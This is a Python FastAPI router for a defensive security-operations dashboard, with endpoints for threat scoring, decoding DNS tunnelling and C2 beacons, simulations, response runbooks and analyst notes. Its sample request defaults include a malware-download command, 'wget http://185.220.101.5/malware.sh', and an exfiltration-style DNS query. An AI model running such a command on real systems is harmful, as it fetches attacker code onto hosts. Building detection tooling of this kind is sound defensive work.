import uuid
import datetime
from typing import Dict, Any, List, Optional
from fastapi import APIRouter, Query, Body, HTTPException
from pydantic import BaseModel

from app.utils.living_soc_service import (
    LivingThreatScoreEngine,
    GhostModeDecoder,
    WhatIfSimulatorEngine,
    AnomalyNarrativeEngine,
    BlameGameMatrixService,
    GlobalThreatIndexService,
    OneClickRunbookEngine,
    ANNOTATION_STORE,
    SECURITY_SCORECARD
)

router = APIRouter(prefix="/living", tags=["Living Telemetry & Interactive SOC Nexus"])

# Request models
class DnsDecodeRequest(BaseModel):
    subdomain_query: str = "aGVsbG8gd29ybGQ=.tunnel.exfil-c2.net"

class C2DecryptRequest(BaseModel):
    raw_hex: Optional[str] = "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00"

class WhatIfFirewallRequest(BaseModel):
    ip: str = "185.220.101.5"
    retro_minutes: int = 10

class WhatIfPatchRequest(BaseModel):
    service_name: str = "k8s-payments-api"
    patch_version: str = "v2.1.0"

class NarrativeRequest(BaseModel):
    ip: str = "185.220.101.5"
    protocol: str = "SSH"
    command: str = "wget http://185.220.101.5/malware.sh"

class RunbookIsolateRequest(BaseModel):
    target_ip: str = "185.220.101.5"
    host_id: str = "web-server-01"

class AddAnnotationRequest(BaseModel):
    target_ip: str
    author: str = "Current Analyst"
    note: str
    tags: Optional[List[str]] = ["CONFIRMED_INCIDENT"]

@router.get("/hbs/{host_id}")
def get_host_behavior_score(
    host_id: str,
    rpm: int = Query(4850),
    error_rate: float = Query(42.5),
    bad_asn: bool = Query(True)
):
    """Returns dynamic living Host Behavior Score (HBS 0-100) with color gauge and factor penalties."""
    return LivingThreatScoreEngine.calculate_hbs(host_id, rpm, error_rate, bad_asn)

@router.post("/ghost-mode/decode-dns")
def decode_dns_tunneling(req: DnsDecodeRequest):
    """Decodes obfuscated Base64/Hex DNS tunneling queries into cleartext exfiltrated data."""
    return GhostModeDecoder.decode_dns_tunnel(req.subdomain_query)

@router.post("/ghost-mode/decrypt-c2")
def decrypt_c2_beacon(req: C2DecryptRequest):
    """Extracts commander tasks and configuration from Cobalt Strike / Sliver C2 Beacon frames."""
    return GhostModeDecoder.decrypt_c2_beacon(req.raw_hex or "")

@router.get("/ghost-mode/stego")
def analyze_steganography(asset: str = Query("banner_logo.png")):
    """Performs LSB variance & entropy analysis to uncover hidden exfiltrated keys."""
    return GhostModeDecoder.analyze_steganography(asset)

@router.post("/what-if/simulate-firewall")
def simulate_firewall_block(req: WhatIfFirewallRequest):
    """Simulates retroactive perimeter block to project what would have happened -10m ago."""
    return WhatIfSimulatorEngine.simulate_perimeter_block(req.ip, req.retro_minutes)

@router.post("/what-if/simulate-patch")
def simulate_service_patch(req: WhatIfPatchRequest):
    """Simulates applying a security patch and recalculates likely next steps prediction."""
    return WhatIfSimulatorEngine.simulate_patch_application(req.service_name, req.patch_version)

@router.post("/what-if/simulate-honeypot")
def simulate_honeypot_lure(subnet: str = Query("10.244.3.0/24"), decoy: str = Query("Fake PostgreSQL DB")):
    """Simulates placing a virtual honeypot into attack path to predict traffic diversion."""
    return WhatIfSimulatorEngine.simulate_honeypot_placement(subnet, decoy)

@router.post("/anomaly-narrative")
def generate_anomaly_narrative(req: NarrativeRequest):
    """Generates a 3-sentence executive story and attack sentiment tone for raw logs."""
    return AnomalyNarrativeEngine.generate_narrative(req.ip, req.protocol, req.command)

@router.get("/blame-game/{service_name}")
def get_blame_game_matrix(service_name: str):
    """Correlates security telemetry to recent CI/CD deployments, IaC changes, and open Jira tickets."""
    return BlameGameMatrixService.get_accountability_context(service_name)

@router.get("/global-threat-index")
def get_global_threat_index():
    """Returns global threat index, local vs global comparisons, and country surge alerts."""
    return GlobalThreatIndexService.get_global_comparison()

@router.post("/runbook/isolate-host")
def execute_isolate_host_runbook(req: RunbookIsolateRequest):
    """Executes 1-click multi-step emergency response: iptables, pod eviction, Slack, Jira."""
    return OneClickRunbookEngine.execute_isolate_host_runbook(req.target_ip, req.host_id)

@router.post("/runbook/rotate-keys")
def execute_rotate_keys_runbook(service: str = Query("k8s-payments-api")):
    """Executes 1-click secret rotation and rolling container reload."""
    return OneClickRunbookEngine.execute_rotate_keys_runbook(service)

@router.get("/annotations")
def get_annotations():
    """Lists collaborative analyst annotations, sticky notes, and tags."""
    return ANNOTATION_STORE

@router.post("/annotations")
def add_annotation(req: AddAnnotationRequest):
    """Adds a new collaborative note or tag to an IP or event."""
    new_note = {
        "id": f"note_{uuid.uuid4().hex[:6]}",
        "target_ip": req.target_ip,
        "author": req.author,
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "note": req.note,
        "tags": req.tags or ["CONFIRMED_INCIDENT"],
        "pinned": True
    }
    ANNOTATION_STORE.insert(0, new_note)
    return new_note

@router.get("/scorecard")
def get_security_scorecard():
    """Returns organizational security scorecard, MTTD/MTTR benchmarks, and team leaderboard."""
    return SECURITY_SCORECARD
